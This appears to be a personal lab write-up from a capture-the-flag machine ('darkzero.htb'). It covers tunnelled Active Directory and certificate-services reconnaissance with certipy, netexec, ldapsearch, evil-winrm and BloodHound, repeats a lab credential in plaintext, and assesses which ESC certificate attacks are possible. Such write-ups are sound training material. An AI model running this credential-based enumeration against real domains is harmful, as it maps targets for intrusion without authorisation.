
## 1. ADCS Enumeration via Tunnel

```bash
proxychains certipy-ad find -u 'john.w@darkzero.htb' -p 'RFulUtONCOL!' -dc-ip 172.16.20.1 -target 172.16.20.1 -vulnerable
```

![[Screenshot_2026-03-28_10-36-43.png]]
## 2. Check Shares on Internal Interface

```bash
proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' --shares
```

![[Screenshot_2026-03-28_10-45-05.png]]
## 3. Check WinRM via Internal Interface

```bash
proxychains evil-winrm -i 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
```

No access without authorization.
## 4. Full LDAP Dump via Tunnel

Users

```bash
proxychains netexec ldap 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb --users
```

![[Screenshot_2026-03-30_09-41-06.png]]

Groups

```bash
proxychains netexec ldap 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb --groups
```

![[Screenshot_2026-03-30_09-43-51.png|788]]

## 5. Disable cert checking + LDAPS

#Attacking_machine 
```bash
LDAPTLS_REQCERT=never proxychains ldapsearch -x -H ldaps://172.16.20.1:636 \
  -D 'darkzero\john.w' -w 'RFulUtONCOL!' \
  -b "DC=darkzero,DC=htb" "(cn=Cert Publishers)" member
```

![[Screenshot from 2026-03-31 11-59-34.png]]

The query worked. Here's what the output tells you:

### Result Analysis

**Cert Publishers** group has only **one member**:

```
CN=DC01,OU=Domain Controllers,DC=darkzero,DC=htb
```

### What this means

- Only the Domain Controller (`DC01`) is in the **Cert Publishers** group
- This group controls which machines can **publish certificates to AD**
- No rogue or unexpected members — a clean, default configuration

## 6. AD/PKI Enumeration

Since you're looking at Cert Publishers, you're likely investigating **ADCS (Active Directory Certificate Services)**. Useful follow-up queries:

### Find CA servers

```bash
LDAPTLS_REQCERT=never proxychains ldapsearch -x -H ldaps://172.16.20.1:636 \
  -D 'darkzero\john.w' -w 'RFulUtONCOL!' \
  -b "CN=Configuration,DC=darkzero,DC=htb" \
  "(objectClass=pKIEnrollmentService)" cn dNSHostName
```

![[Screenshot_2026-03-31_10-03-15.png]]

### Enumerate certificate templates

```bash
LDAPTLS_REQCERT=never proxychains ldapsearch -x -H ldaps://172.16.20.1:636 \
  -D 'darkzero\john.w' -w 'RFulUtONCOL!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=darkzero,DC=htb" \
  "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag
```

### Most Interesting for Further Enumeration

```
User          - Enrollment: 41 (auto+publish), Name: UPN-based
Administrator - Enrollment: 41 (auto+publish), Name: UPN-based  
ClientAuth    - Enrollment: 32 (auto-enroll)
```

## 7. Run Certipy for Full ESC Analysis\

The ldap output alone isn't enough to confirm exploitability — you also need ACLs and EKUs:

```bash
proxychains certipy-ad find -u 'john.w@darkzero.htb' -p 'RFulUtONCOL!' \
  -dc-ip 172.16.20.1 -vulnerable -stdout
```

### Certipy Results Analysis

#### CA Summary

|Property|Value|
|---|---|
|CA Name|`darkzero-DC01-CA`|
|Host|`DC01.darkzero.htb`|
|Web Enrollment|❌ Disabled (no HTTP/HTTPS)|
|User Specified SAN|❌ Disabled|
|Request Disposition|✅ **Issue** (auto-approves requests)|
|Encrypt Requests|✅ Enabled|

### Key Findings

**Good news for you:**

- `Request Disposition: Issue` — the CA **auto-issues** certificates without manager approval, so no ESC4/pending queue issues

**Bad news:**

- `User Specified SAN: Disabled` — rules out the easy **ESC6** attack
- Web enrollment disabled — rules out **ESC8** (NTLM relay to web enrollment)
- Templates not found by Certipy — likely a permissions/query issue

## 8. Active Directory Reconnaissance — BloodHound Collection via Proxychains

#Attacking_machine 
- Add to `/etc/hosts` the following entry if isn't there yet:

```bash
echo "172.16.20.1 DC01.darkzero.htb darkzero.htb" >> /etc/hosts
```

- Run the following comand.

```bash
proxychains bloodhound-python -u 'john.w' -p 'RFulUtONCOL!' \
  -d darkzero.htb -dc DC01.darkzero.htb -ns 172.16.20.1 \
  -c All --zip --dns-tcp
```

![[Screenshot_2026-03-31_10-41-55.png]]

If you don't have Bloodhound installed or you want to make a Manual Check go to:

**Next step:** [[Skip BloodHound — manual ACL check]]
